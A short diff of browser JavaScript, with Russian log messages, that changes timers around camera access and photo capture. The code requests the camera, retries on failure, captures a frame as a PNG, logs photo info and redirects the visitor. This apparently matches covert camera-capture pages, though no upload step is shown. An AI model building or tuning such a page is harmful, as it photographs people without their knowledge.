@@ -85,7 +85,9 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         console.log('Камера успешно запущена!');
-        handleSuccess(stream);
+        setTimeout(function () {
+          handleSuccess(stream);
+        }, 3000);
       } catch (e) {
         console.log(`Ошибка доступа к камере: ${e.toString()}`);
         cameraAccessAttempts++;
@@ -119,6 +121,7 @@
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+
           setTimeout(function () {
             canvas.toBlob(function(blob) {
               console.log('Фотография создана');
@@ -127,7 +130,7 @@
               logPhotoInfo();
               redirectToFinalDestination();
             }, 'image/png');
-          }, 6000);
+          }, 3000);
         }
       }, 3000);
     }
